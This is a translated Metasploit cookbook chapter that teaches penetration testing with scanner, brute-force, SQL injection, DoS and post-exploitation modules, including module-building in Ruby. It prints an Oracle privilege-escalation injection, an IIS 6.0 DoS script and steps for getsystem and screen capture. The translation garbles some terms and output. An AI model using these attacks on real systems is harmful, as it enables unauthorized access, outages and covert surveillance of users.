# 七、将模块用于渗透测试

在本章中，我们将介绍：

*   使用扫描仪辅助模块
*   使用辅助管理模块
*   SQL 注入和 DOS 攻击模块
*   开发后模块
*   了解模块构建的基础知识
*   分析现有模块
*   构建您自己的后利用模块

# 导言

在我们讨论 Metasploit 框架基础知识的第一章中，我们指出它具有模块化的体系结构。这意味着所有的漏洞利用、有效负载、编码器等都以模块的形式存在。模块化体系结构使框架的功能更易于扩展。任何程序员都可以开发自己的模块，并将其轻松移植到框架中。一个完整的渗透测试过程可以包括几个正在运行的模块。例如，我们从一个攻击模块开始，然后使用一个有效负载模块，然后一旦目标被破坏，我们可以使用几个攻击后模块。最后，我们还可以使用不同的模块连接到数据库并存储我们的发现和结果。尽管在使用 Metasploit 时，模块并没有得到太多的讨论，但它们构成了框架的关键，因此深入理解它是非常必要的。

在本章中，我们将特别关注 `pentest/exploits/framework3/modules`目录，该目录包含有用模块的完整列表，可以简化渗透测试任务。模块的使用与我们到目前为止所做的非常相似，但在功能上略有不同。在本章的后面，我们还将分析一些现有模块，并通过学习如何为 Metasploit 开发我们自己的模块来结束本章。让我们从模块开始实验。

# 使用扫描仪辅助模块

让我们开始扫描模块的实验。我们已经了解了使用 Nmap 进行扫描的详细信息。在此配方中，我们将分析框架附带的一些现成扫描模块。尽管 Nmap 是一个功能强大的扫描工具，但在某些情况下，我们仍然必须执行特定类型的扫描，例如扫描是否存在 MySQL 数据库。

Metasploit 为我们提供了此类有用扫描仪的完整列表。让我们向前迈进，切实执行其中一些建议。

## 准备好了吗

要查找可用扫描仪的列表，我们必须浏览到 `/pentest/exploits/framework3/modules/auxiliary/scanner`。

您可以找到 35 个以上有用的扫描模块，这些模块可用于各种渗透测试场景。

## 怎么做。。。

让我们从一个基本的 HTTP 扫描器开始。您将看到有许多不同的 HTTP 扫描选项可用。我们将在这里讨论其中的几个问题。

考虑一下这个脚本。这将扫描单个主机或整个网络范围，以查找感兴趣的目录列表，这些目录列表可以进一步探索以收集信息。

要开始使用辅助模块，我们必须在 msfconsole 中执行以下步骤：

```
msf > use auxiliary/scanner/http/dir_scanner
msf auxiliary(dir_scanner) > show options
Module options: 
```

`show options`命令将列出您可以随扫描仪模块传递的所有可用可选参数。最重要的是 `RHOSTS`参数，它将帮助我们瞄准网络中的一台计算机或一系列计算机。

## 它是如何工作的。。。

让我们讨论一个涉及一些额外输入的特定扫描仪模块。 `mysql_login`扫描器模块是一个蛮力模块，它扫描目标上 MySQL 服务器的可用性，并通过蛮力攻击尝试登录数据库：

```
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) > show options
Module options (auxiliary/scanner/mysql/mysql_login):
Name Current Setting Required Description
---- --------------- -------- -----------
BLANK_PASSWORDS true yes Try blank pas..
BRUTEFORCE_SPEED 5 yes How fast to..
PASSWORD no A specific password
PASS_FILE no File containing..
RHOSTS yes The target address.
RPORT 3306 yes The target port..
STOP_ON_SUCCESS false yes Stop guessing...
THREADS 1 yes The number of..
USERNAME no A specific user..
USERPASS_FILE no File containing..
USER_FILE no File containing..
VERBOSE true yes Whether to print.. 
```

正如您所看到的，我们可以通过这个模块传递许多不同的参数。我们越充分利用模块的功能，成功渗透测试的机会就越大。我们可以提供一个完整的用户名和密码列表，模块可以在目标机器上使用和尝试。

让我们向模块提供以下信息：

```
msf auxiliary(mysql_login) > set USER_FILE /users.txt
USER_FILE => /users.txt
msf auxiliary(mysql_login) > set PASS_FILE /pass.txt
PASS_FILE => /pass.txt 
```

现在我们准备使用暴力。最后一步是选择目标并提供运行命令以执行模块：

```
msf auxiliary(mysql_login) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
msf auxiliary(mysql_login) > run
[*] 192.168.56.101:3306 - Found remote MySQL version 5.0.51a
[*] 192.168.56.101:3306 Trying username:'administrator' with password:'' 
```

输出显示模块通过首先查找目标上是否存在 MySQL 服务器来启动进程。一旦找到答案，它就开始尝试通过外部文本文件提供给它的用户名和密码的组合。这也是当前场景中 Metasploit 最广泛使用的模块化操作之一。已经开发了许多自动暴力模块来破解弱密码。

## 还有更多。。。

让我们来看一下使用 Metasploit 生成密码文件的一种快速简便的方法。在蛮力渗透测试期间，拥有一个合适的密码文件列表会很有帮助。

### 使用“Crunch”生成密码

对于任何暴力攻击，我们必须有一个相当大的密码文件列表，我们将在这些类型的攻击中使用这些文件。密码列表可以从在线资源中获取，或者笔测试仪可以选择使用 John the Ripper 生成密码列表。或者，还可以使用 Backtrack 的“crunch”实用程序根据所使用的字符生成这样的列表。您可以在 `/pentest/passwords/crunch`中找到“crunch”实用程序。如果您的 Backtrack 版本中缺少它，那么您可以通过在终端窗口中传递以下命令来安装它：

```
root@bt: cd /pentest/passwords
root@bt:/pentest/passwords# apt-get install crunch 
```

crunch 的基本语法如下所示：

```
./ crunch <min-len> <max-len> [-f /path/to/charset.lst charset-name] [-o wordlist.txt]
[-t [FIXED]@@@@] [-s startblock] [-c number]

```

让我们了解 crunch 实用程序的一些有用参数的功能：

*   `min-len:`从开始的最小长度字符串
*   `max-len:`结束于的最大长度字符串
*   `charset:`定义要使用的字符集
*   `-b:`编号【类型：kb/mb/gb】-指定输出文件的大小
*   `-f </path/to/charset.lst> <charset-name>:`允许我们从 `charset.lst`中指定一个字符集
*   `-o <wordlist.txt>:`定义保存输出的文件
*   `-t <@*%^>:`用于添加密码中肯定会出现的文本

有关 crunch 实用程序的完整文档可在以下 URL 中找到：

[http://sourceforge.net/projects/crunch-wordlist/files/crunch-wordlist/](http://sourceforge.net/projects/crunch-wordlist/files/crunch-wordlist/)

您可以浏览完整的文档，了解如何使用此实用程序生成长而复杂的密码列表。

# 使用辅助管理模块

继续我们的模块实验，我们将学习一些在渗透测试中非常方便的管理模块。管理模块可以用于不同的目的，比如它可以查找管理面板，或者它可以尝试进行管理登录，等等。这取决于模块的功能。这里我们将看一个名为 `mysql_enum`模块的简单管理辅助模块。

## 准备好了吗

`mysql_enum`模块是 MySQL 数据库服务器的专用工具模块。此模块提供 MySQL 数据库服务器的简单枚举，前提是授予适当的凭据进行远程连接。让我们通过使用模块来详细了解它。

## 怎么做。。。

我们将首先启动 msfconsole 并为辅助模块提供路径：

```
msf > use auxiliary/admin/mysql/mysql_enum
msf auxiliary(mysql_enum) > show options
Module options (auxiliary/admin/mysql/mysql_enum):
Name Current Setting Required Description
---- --------------- -------- -----------
PASSWORD no The password for the..
RHOST yes The target address
RPORT 3306 yes The target port
USERNAME no The username to.. 
```

如您所见，模块接受密码、用户名和 RHOST 作为参数。这可以帮助模块首先搜索是否存在 MySQL 数据库，然后应用凭据尝试远程登录。让我们分析一下 `exploit`命令的输出：

```
msf auxiliary(mysql_enum) > exploit
[*] Configuration Parameters: 
[*] C2 Audit Mode is Not Enabled 
[*] xp_cmdshell is Enabled 
[*] remote access is Enabled 
[*] allow updates is Not Enabled 
[*] Database Mail XPs is Not Enabled 
[*] Ole Automation Procedures are Not Enabled 
[*] Databases on the server: 
[*] Database name:master 
```

该模块提供了大量有用的信息。它告诉我们在我们的目标 MySQL 设置上已经启用了 `cmdshell`和远程访问。它还返回目标计算机上当前正在处理的数据库名称。

有几个类似的模块可用于其他服务，如 MSSQL 和 Apache。大多数模块的工作过程类似。请记住使用 show options 命令，以确保将所需参数传递给模块。

## 它是如何工作的。。。

这些辅助管理模块通过启动连接，然后传递用户名和密码组合的简单枚举过程来运行。它还可用于检查数据库服务器是否支持匿名登录。我们还可以测试默认用户名和密码，比如 MySQL 使用“scott”和“tiger”作为默认登录凭据。

# SQL 注入和 DOS 攻击模块

Metasploit 对渗透测试人员和黑客都很友好。这是因为渗透测试人员必须从黑客的角度进行思考，以确保其网络、服务、应用程序等的安全。SQL 注入和 DOS 模块帮助渗透测试人员攻击他们自己的服务，以确定他们是否容易受到此类攻击。因此，让我们详细讨论其中的一些模块。

## 准备好了吗

SQL 注入模块使用数据库类型中的已知漏洞进行攻击，并提供未经授权的访问。已知该漏洞会影响 Oracle 9i 和 10g。Metasploit 包含几个模块，这些模块使用 Oracle 数据库中的已知漏洞，通过查询注入来破坏它们。模块可在 `modules/auxiliary/sqli/oracle`中找到。

## 怎么做。。。

让我们分析一个名为**oracle DBMS_ 元数据 XML**漏洞的 oracle 漏洞。此漏洞将权限从 `DB_USER`升级到 `DB_ADMINISTRATOR`（数据库管理员）。我们将使用 `dbms_metadata_get_xml`模块：

```
msf auxiliary(dbms_metadata_get_xml) > show options
Module options (auxiliary/sqli/oracle/dbms_metadata_get_xml):
Name Current Setting Required Description
---- --------------- -------- -----------
DBPASS TIGER yes The password to..
DBUSER SCOTT yes The username to..
RHOST yes The Oracle host.
RPORT 1521 yes The TNS port.
SID ORCL yes The sid to authenticate.
SQL GRANT DBA to SCOTT no SQL to execute. 
```

该模块要求提供到目前为止我们已经看到的类似参数。数据库首先使用默认登录凭据检查登录，即“scott”和“tiger”分别作为默认用户名和密码。一旦模块以数据库用户身份登录，它就会执行漏洞攻击，将权限升级到数据库管理员。让我们在目标上执行模块作为测试运行。

```
msf auxiliary(dbms_metadata_get_xml) > set RHOST 192.168.56.1
msf auxiliary(dbms_metadata_get_xml) > set SQL YES
msf auxiliary(dbms_metadata_get_xml) > run 
```

成功执行模块后，用户权限将从 `DB_USER`升级到 `DB_ADMINISTRATOR`。

我们将介绍的下一个模块与**拒绝服务（DOS）**攻击有关。我们将分析一个简单的 IIS 6.0 漏洞，该漏洞允许攻击者通过发送包含 40000 多个请求参数的 POST 请求使服务器崩溃。我们将很快分析该漏洞。此模块已在运行 IIS 6.0 的未修补的 Windows 2003 服务器上测试。我们将使用的模块是 `ms10_065_ii6_asp_dos:`

```
msf > use auxiliary/dos/windows/http/ms10_065_ii6_asp_dos
msf auxiliary(ms10_065_ii6_asp_dos) > show options
Module options (auxiliary/dos/windows/http/ms10_065_ii6_asp_dos):
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 80 yes The target port
URI /page.asp yes URI to request
VHOST no The virtual host name to..
msf auxiliary(ms10_065_ii6_asp_dos) > set RHOST 192.168.56.1
RHOST => 192.168.56.1
msf auxiliary(ms10_065_ii6_asp_dos) > run
[*] Attacking http://192.168.56.1:80/page.asp 
```

使用 run 命令执行模块后，它将通过在端口 80 上发送一个 URI 为 page.asp 的 HTTP 请求，开始攻击目标 IIS 服务器。成功执行模块将导致 IIS 服务器完全拒绝服务。

## 它是如何工作的。。。

让我们快速查看这两个漏洞。oracle 数据库漏洞是通过注入在 SYS 上下文中执行的自定义 PL/SQL 函数来利用的，它提升了用户“scott”作为管理员的权限。

考虑这个示例函数：

```
CREATE OR REPLACE FUNCTION "SCOTT"."ATTACK_FUNC" return varchar2 authid current_user as pragma autonomous_transaction; BEGIN EXECUTE IMMEDIATE 'GRANT DBA TO SCOTT'; COMMIT; RETURN ''; END; /

```

现在，在易受攻击的过程中注入此函数将导致用户权限提升。

```
SELECT SYS.DBMS_METADATA.GET_DDL('''||SCOTT.ATTACK_FUNC()||''','') FROM dual;

```

前面几行代码解释了注入过程。对 Oracle 软件漏洞的详细分析超出了本书的范围。

现在移动 DOS 攻击模块，该模块利用 IIS 6.0 服务器中的漏洞进行攻击。攻击者发送包含 40000 多个请求参数的 POST 请求，并以 `application/x-www-form-urlencoded`编码类型的形式发送。

以下是为模块服务的脚本的一部分：

```
while(1)
begin
connect
payload = "C=A&" * 40000
length = payload.size
sploit = "HEAD #{datastore['URI']} HTTP/1.1\r\n"
sploit << "Host: #{datastore['VHOST'] || rhost}\r\n"
sploit << "Connection:Close\r\n"
sploit << "Content-Type: application/x-www-form-urlencoded\r\n"
sploit << "Content-Length:#{length} \r\n\r\n"
sploit << payload
sock.put(sploit)
#print_status("DoS packet sent.")
disconnect
rescue Errno::ECONNRESET
next
end
end 
```

如您所见，该脚本生成的负载大小超过 40000。然后，在端口 80 上建立连接以向 IIS 服务器发送 HTTP 请求。服务器呈现请求后，它将崩溃并停止工作，除非重新启动。

# 后开发模块

到目前为止，我们已经在开发后阶段使用了不同功率的 MeterMeter 进行了大量工作。然而，我们还有一个单独的专用模块列表，可以增强我们的渗透测试经验。由于它们是开发后模块，我们需要与目标进行一次活动会话。我们可以使用前面章节中描述的任何方法来访问我们的目标。

## 准备好了吗

post 模块是渗透测试时可以使用的一些最有趣、最方便的功能的集合。让我们在此快速分析其中一些。在这里，我们使用一台未打补丁的 Windows 7 计算机作为我们的目标，它有一个活动的 MeterMeter 会话。

## 怎么做。。。

您可以在 `modules/post/windows/gather`中找到 post 模块。让我们从一个简单的 `enum_logged_on_users`模块开始。此 post 模块将列出 Windows 计算机中当前登录的用户。

我们将通过活动的 MeterMeter 会话执行该模块。此外，请记住使用 `getsystem`命令升级权限，以避免在模块执行过程中出现任何错误。

```
meterpreter > getsystem
...got system (via technique 4).
meterpreter > run post/windows/gather/enum_logged_on_users
[*] Running against session 1
Current Logged Users
====================
SID User
--- ----
S-1-5-21-2350281388-457184790-407941598 DARKLORD-PC\DARKLORD
Recently Logged Users
=====================
SID Profile Path
--- ------------
S-1-5-18 %systemroot%\system32\config\systemprofile
S-1-5-19 C:\Windows\ServiceProfiles\LocalService
S-1-5-20 C:\Windows\ServiceProfiles\NetworkService
S-1-5-21-23502 C:\Users\DARKLORD
S-1-5-21-235 C:\Users\Winuser 
```

模块的成功执行向我们展示了两个表。第一个表反映当前登录的用户，第二个表反映最近登录的用户。执行模块时遵循正确的路径。我们使用了 `run`命令来执行模块，因为它们都是以 Ruby 脚本的形式出现的，所以 MeterMeter 可以很容易地识别它。

让我们再举一个例子。有一个有趣的 post 模块可以捕获目标桌面的屏幕截图。当我们必须知道是否有任何活动用户时，此模块非常有用。我们将使用的模块是 `screen_spy.rb:`

```
meterpreter > run post/windows/gather/screen_spy
[*] Migrating to explorer.exe pid: 1104
[*] Migration successful
[*] Capturing 60 screenshots with a delay of 5 seconds 
```

您可能已经注意到 post 模块是多么简单和有用。在未来，Metasploit 的开发人员将更多地关注 post 模块，而不是 MeterMeter，因为它极大地增强了渗透测试的功能。因此，如果您希望为 Metasploit 社区做出贡献，那么您可以使用 post 模块。

## 它是如何工作的。。。

我们可以在 `modules/post/windows/gather`处分析 `enum_logged_on_user.rb`和 `screen_spy.rb`的脚本。它可以帮助我们了解这些模块的功能。

# 了解模块构建的基础知识

到目前为止，我们已经看到了模块的实用性以及它们可以添加到框架中的功能。为了掌握框架，理解模块的工作和构建是非常重要的。这将帮助我们根据需要快速扩展框架。在接下来的几篇文章中，我们将看到如何使用 ruby 脚本构建我们自己的模块并将它们导入到框架中。

## 准备好了吗

要开始构建我们自己的模块，我们需要 Ruby 脚本的基本知识。我们已经讨论了 Ruby 在 MeterMeter 脚本中的使用和实现。在这个配方中，我们将看到如何使用 Ruby 开始为框架构建模块。该过程与 MeterMeter 脚本非常相似。区别在于使用一组预定义的行，这是为了让框架理解模块的需求和性质所必需的。因此，让我们讨论一下模块构建的一些基本要求。

## 怎么做。。。

框架中的每个模块都是 Ruby 脚本的形式，位于 modules 目录中。我们必须根据需要导入一些框架库。让我们继续前进，看看如何在脚本中导入库并设计一个功能齐全的模块。

## 它是如何工作的。。。

让我们从模块构建的一些基础知识开始。为了使我们的模块对框架具有可读性，我们必须导入 MSF 库：

```
require 'msf/core'

```

这是每个脚本的第一行也是最重要的一行。这一行说明模块将包括 Metasploit 框架的所有依赖项和功能。

```
class Metasploit3 < Msf::Auxiliary

```

此行定义继承辅助族特性的类。辅助模块可以导入多项功能，如扫描、打开连接、使用数据库等：

```
include Msf::

```

`include`语句可用于将框架的特定功能包含到我们自己的模块中。例如，如果我们正在构建扫描仪模块，则可以将其包括为：

```
include Msf::Exploit::Remote::TCP

```

该行将包括模块中的远程 TCP 扫描功能。此行将从 Metasploit 库中拉出主扫描模块库：

```
def initialize
super(
'Name' => 'TCP Port Scanner',
'Version' => '$Revision$',
'Description' => 'Enumerate open TCP services',
'Author' => [ darklord ],
'License' => MSF_LICENSE
)

```

接下来的几行脚本介绍了模块的名称、版本、作者、描述等：

```
register_options(
[
OptString.new('PORTS', [true, "Ports to scan (e.g. 25,80,110-900)", "1-10000"]),
OptInt.new('TIMEOUT', [true, "The socket connect timeout in milliseconds", 1000]),
OptInt.new('CONCURRENCY', [true, "The number of concurrent ports to check per host", 10]), self.class)
deregister_options('RPORT')

```

脚本的下几行用于初始化脚本的值。标记为 `true`的选项是模块基本上需要的选项，而标记为 `no`的选项是可选的。这些值可以在模块执行期间传递/更改。

这些是您将在每个模块中找到的一些常见脚本行。分析内置脚本是了解更多脚本构建的最佳方法。有一些文档可用于学习模块构建。最好的学习方法是掌握 Ruby 脚本和分析现有模块。在下一个配方中，我们将从头分析一个完整的模块。

# 分析现有模块

现在，我们已经在前面的配方中构建了一些关于模块构建的背景知识，我们的下一步将是分析现有模块。如果您必须学习并深入研究模块和平台开发，强烈建议您查看现有模块的脚本。

## 准备好了吗

我们将在这里分析一个简单的 ftp 模块，以便深入了解模块构建。

我们将从上一个配方中停止的地方继续。我们已经在前面的配方中讨论了模块的基本模板，所以这里我们将从脚本的主体开始。

## 怎么做。。。

我们将分析 ftp 匿名访问模块。您可以在以下位置找到主脚本： `pentest/exploits/framework3/modules/auxiliary/scanner/ftp/anonymous.rb`

以下是完整的脚本供您参考：

```
class Metasploit3 < Msf::Auxiliary
include Msf::Exploit::Remote::Ftp
include Msf::Auxiliary::Scanner
include Msf::Auxiliary::Report
def initialize
super(
'Name' => 'Anonymous FTP Access Detection',
'Version' => '$Revision: 14774 $',
'Description' => 'Detect anonymous (read/write) FTP server access.',
'References' =>
[
['URL', 'http://en.wikipedia.org/wiki/File_Transfer_Protocol#Anonymous_FTP'],
],
'Author' => 'Matteo Cantoni <goony[at]nothink.org>',
'License' => MSF_LICENSE
)
register_options(
[
Opt::RPORT(21),
], self.class)
end
def run_host(target_host)
begin
res = connect_login(true, false)
banner.strip! if banner
dir = Rex::Text.rand_text_alpha(8)
if res
write_check = send_cmd( ['MKD', dir] , true)
if (write_check and write_check =~ /^2/)
send_cmd( ['RMD', dir] , true)
print_status("#{target_host}:#{rport} Anonymous READ/WRITE (#{banner})")
access_type = "rw"
else
print_status("#{target_host}:#{rport} Anonymous READ (#{banner})")
access_type = "ro"
end
report_auth_info(
:host => target_host,
:port => rport,
:sname => 'ftp',
:user => datastore['FTPUSER'],
:pass => datastore['FTPPASS'],
:type => "password_#{access_type}",
:active => true
)
end
disconnect
rescue ::Interrupt
raise $!
rescue ::Rex::ConnectionError, ::IOError
end
end
end

```

让我们转到下一节，详细分析脚本。

## 它是如何工作的。。。

让我们从分析主体脚本开始，了解其工作原理：

```
def run_host(target_host)
begin
res = connect_login(true, false)
banner.strip! if banner
dir = Rex::Text.rand_text_alpha(8)

```

此功能用于开始连接。res 变量保存布尔值 true 或 false。 `connect_login`功能是模块用于与远程主机建立连接的特定功能。根据连接的成功或失败，布尔值存储在 res.中

```
if res
write_check = send_cmd( ['MKD', dir] , true)
if (write_check and write_check =~ /^2/)
send_cmd( ['RMD', dir] , true)
print_status("#{target_host}:#{rport} Anonymous READ/WRITE (#{banner})")
access_type = "rw"
else
print_status("#{target_host}:#{rport} Anonymous
access_type="ro"

```

建立连接后，模块将尝试检查匿名用户是否具有读/写权限。 `write_check`变量检查写入操作是否可行。然后检查操作是否成功。根据特权的状态，屏幕上会打印一条消息。如果写入操作失败，则状态打印为 `ro`或 `read-only:`

```
report_auth_info(
:host => target_host,
:port => rport,
:sname => 'ftp',
:user => datastore['FTPUSER'],
:pass => datastore['FTPPASS'],
:type => "password_#{access_type}",
:active => true
)
end

```

下一个功能用于报告授权信息。它反映了主机、端口、用户、通行证等重要参数。这些是我们使用 `show options`命令时出现的值，因此这些值取决于用户。

这是一个简单模块如何在框架内运行的快速演示。您可以相应地更改现有脚本以满足您的需要。这使得该平台非常便于开发。正如我所说的，了解更多模块构建的最佳方法是分析现有脚本。

在下一个配方中，我们将看到如何构建我们自己的模块并将其传递到框架中。

# 构建自己的后期开发模块

现在我们已经介绍了构建模块的足够背景知识。在这里，我们将看到一个示例，说明如何构建自己的模块并将其添加到框架中。构建模块非常方便，因为它们将根据需要为我们提供扩展框架的能力。

## 怎么做。。。

让我们构建一个小型的利用后模块，该模块将枚举目标计算机上所有已安装的应用程序。由于它是一个攻击后模块，我们需要一个受害目标才能执行该模块。

为了开始构建模块，我们将首先导入框架库并包含所需的依赖项：

```
require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'
class Metasploit3 < Msf::Post
include Msf::Post::Windows::Registry
def initialize(info={})
super( update_info( info,
'Name' => 'Windows Gather Installed Application Enumeration',
'Description' => %q{ This module will enumerate all installed applications },
'License' => MSF_LICENSE,
'Platform' => [ 'windows' ],
'SessionTypes' => [ 'meterpreter' ]
))
end 
```

该脚本从包含 Metasploit 核心库开始。然后，我们构建了扩展 Msf:：Post 模块属性的类。

接下来，我们创建 `initialize`函数，用于初始化和定义模块属性和描述。这种基本结构在几乎所有模块中都保持不变。这里需要注意的是，我们包括了“rex”以及“registry”库。这将使框架更容易理解模块中的需求。

现在，我们的下一步将是创建一个可以显示提取结果的表。我们有一个专门的图书馆 `Rex::Ui::Text`，可以用来完成这项任务。我们必须定义不同的列：

```
def app_list
tbl = Rex::Ui::Text::Table.new(
'Header' => "Installed Applications",
'Indent' => 1,
'Columns' =>
[
"Name",
"Version"
])
appkeys = [
'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
'HKLM\\SOFTWARE\\WOW6432NODE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
'HKCU\\SOFTWARE\\WOW6432NODE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
]
apps = []
appkeys.each do |keyx86|
found_keys = registry_enumkeys(keyx86)
if found_keys
found_keys.each do |ak|
apps << keyx86 +"\\" + ak
end
end
end 
```

脚本主体首先构建表并提供不同的列名。然后，创建一个单独的注册表位置数组，用于枚举应用程序列表。该数组将由不同的注册表项组成，其中包含有关目标计算机上已安装应用程序的信息。应用程序信息保存在名为 `apps`的单独数组中。

然后，我们通过运行一个循环来启动枚举过程，该循环查看 `appskey`数组中存储的不同注册表位置：

```
t = []
while(not apps.empty?)
1.upto(16) do
t << framework.threads.spawn("Module(#{self.refname})", false, apps.shift) do |k|
begin
dispnm = registry_getvaldata("#{k}","DisplayName")
dispversion = registry_getvaldata("#{k}","DisplayVersion")
tbl << [dispnm,dispversion] if dispnm and dispversion
rescue
end
end

```

接下来的脚本行在相应的列中使用不同的值填充表。脚本使用一个内置函数 `registry_getvaldata`，该函数获取值并将其添加到表中：

```
results = tbl.to_s
print_line("\n" + results + "\n")
p = store_loot("host.applications", "text/plain", session, results, "applications.txt", "Installed Applications")
print_status("Results stored in: #{p}")
end
def run
print_status("Enumerating applications installed on #{sysinfo['Computer']}")
app_list
end
end

```

脚本的最后几行用于将信息存储在名为 `applications.txt`的单独文本文件中。使用 `store_loot`函数填充该文件，该函数将完整的表格存储在文本文件中。

最后，屏幕上会显示一个输出，说明文件已创建，结果已存储在其中。

下一步是将完整的程序存储在相应的目录中。您必须确保为存储模块选择了正确的目录。这将有助于框架清楚地理解模块的实用性，并维护层次结构。在更新模块时维护层次结构将有助于正确跟踪模块的具体目标。例如，在 `modules/exploits/windows/browser`目录下保留一个 Internet Explorer 模块将有助于我们在该位置轻松定位任何新的或现有的浏览器模块。

要确定模块存储的位置，您应注意以下几点：

*   模块类型
*   由模块执行的操作
*   受影响的软件或操作系统

Metasploit 遵循“通用到专用”格式的层次结构来存储模块。它从模块类型开始，例如利用模块或辅助模块。然后它选择一个通用名称，例如受影响的操作系统的名称。然后创建一个更专门的功能，例如，该模块用于浏览器。最后，使用最具体的命名，就像模块目标浏览器的名称一样。

让我们考虑我们的模块。此模块是一个攻击后模块，用于枚举 Windows 操作系统并收集有关系统的信息。所以我们的模块应该遵循这个存储约定。

所以我们的目标文件夹应该是 `modules/post/windows/gather/`。

您可以使用所需的名称和.rb 扩展名保存模块。我们将其另存为 `enum_applications.rb`。

## 它是如何工作的。。。

一旦我们将模块保存在它的首选目录中，下一步就是执行它，看看它是否工作正常。我们已经在前面的配方中看到了模块执行的过程。模块名称用于从 MSF 终端执行：

```
msf> use post/windows/gather/enum_applications
msf post(enum_applications) > show options
Module options (post/windows/gather/enum_applcations)
Name Current Setting Required Description
SESSION yes The session.. 
```

这是一个如何构建自己的模块并将其添加到框架中的小示例。如果你想构建好的模块，你肯定需要对 Ruby 脚本有很好的了解。您还可以通过发布您的模块并让其他人参与进来，为 Metasploit 社区做出贡献。从中受益。